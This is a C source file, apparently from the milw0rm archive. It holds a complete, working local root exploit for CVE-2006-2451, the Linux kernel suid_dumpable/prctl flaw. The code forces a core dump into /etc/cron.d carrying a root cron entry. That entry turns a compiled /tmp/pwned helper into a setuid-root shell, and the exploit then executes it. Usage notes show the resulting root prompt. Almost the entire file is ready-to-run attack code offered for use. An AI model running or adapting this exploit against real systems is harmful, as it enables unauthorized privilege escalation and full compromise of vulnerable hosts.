/*
 * $Id: raptor_prctl.c,v 1.1 2006/07/13 14:21:43 raptor Exp $
 *
 * raptor_prctl.c - Linux 2.6.x suid_dumpable vulnerability
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * The suid_dumpable support in Linux kernel 2.6.13 up to versions before 
 * 2.6.17.4, and 2.6.16 before 2.6.16.24, allows a local user to cause a denial 
 * of service (disk consumption) and POSSIBILY (yeah, sure;) gain privileges 
 * via the PR_SET_DUMPABLE argument of the prctl function and a program that 
 * causes a core dump file to be created in a directory for which the user does 
 * not have permissions (CVE-2006-2451).
 *
 * Berlin, Sunday July 9th 2006: CAMPIONI DEL MONDO! CAMPIONI DEL MONDO!
 * CAMPIONI DEL MONDO! (i was tempted to name this exploit "pajolo.c";))
 *
 * Greets to Paul Starzetz and Roman Medina, who also exploited this ugly bug.
 *
 * NOTE. This exploit uses the Vixie's crontab /etc/cron.d attack vector: this
 * means that distributions that use a different configuration (namely Dillon's
 * crontab on Slackware Linux) can be vulnerable but not directly exploitable.
 *
 * Usage:
 * $ gcc raptor_prctl.c -o raptor_prctl -Wall
 * [exploit must be dinamically linked]
 * $ ./raptor_prctl
 * [...]
 * sh-3.00#
 *
 * Vulnerable platforms:
 * Linux from 2.6.13 up to 2.6.17.4 [tested on SuSE Linux 2.6.13-15.8-default]
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/prctl.h>

#define INFO1	"raptor_prctl.c - Linux 2.6.x suid_dumpable vulnerability"
#define	INFO2	"Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"

char payload[] = /* commands to be executed by privileged crond */
"\nSHELL=/bin/sh\nPATH=/usr/bin:/usr/sbin:/sbin:/bin\n* * * * *   root   chown root /tmp/pwned; chmod 4755 /tmp/pwned; rm -f /etc/cron.d/core\n";

char pwnage[] = /* build setuid() helper to circumvent bash checks */
"echo \"main(){setuid(0);setgid(0);system(\\\"/bin/sh\\\");}\" > /tmp/pwned.c; gcc /tmp/pwned.c -o /tmp/pwned &>/dev/null; rm -f /tmp/pwned.c";

int main(void)
{
	int 		pid, i;
	struct rlimit 	corelimit;
	struct stat	st;

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* prepare the setuid() helper */
	system(pwnage);

	/* set core size to unlimited */
	corelimit.rlim_cur = RLIM_INFINITY;
	corelimit.rlim_max = RLIM_INFINITY;
	setrlimit(RLIMIT_CORE, &corelimit);

	/* let's do the PR_SET_DUMPABLE magic */
	if (!(pid = fork())) {
		chdir("/etc/cron.d");
		prctl(PR_SET_DUMPABLE, 2);
		sleep(666);
		exit(1);
	}
	kill(pid, SIGSEGV);

	/* did it work? */
	sleep(3);
	if (stat("/etc/cron.d/core", &st) < 0) {
		fprintf(stderr, "Error: Not vulnerable? See comments.\n");
		exit(1);
	}

	fprintf(stderr, "Ready to uncork the champagne? ");
	fprintf(stderr, "Please wait a couple of minutes;)\n");

	/* wait for crond to execute our evil entry */
	for (i = 0; i < 124; i += 2) {
		if (stat("/tmp/pwned", &st) < 0) {
			fprintf(stderr, "\nError: Check /tmp/pwned!\n");
			exit(1);
		}
		if (st.st_uid == 0)	
			break;
		fprintf(stderr, ".");
		sleep(2);
	}

	/* timeout reached? */
	if (i > 120) {
		fprintf(stderr, "\nTimeout: Check /tmp/pwned!\n");
		exit(1);
	}

	/* total pwnage */
	fprintf(stderr, "CAMPIONI DEL MONDO!\n\n");
	system("/tmp/pwned");
	exit(0);
}

// milw0rm.com [2006-07-13]

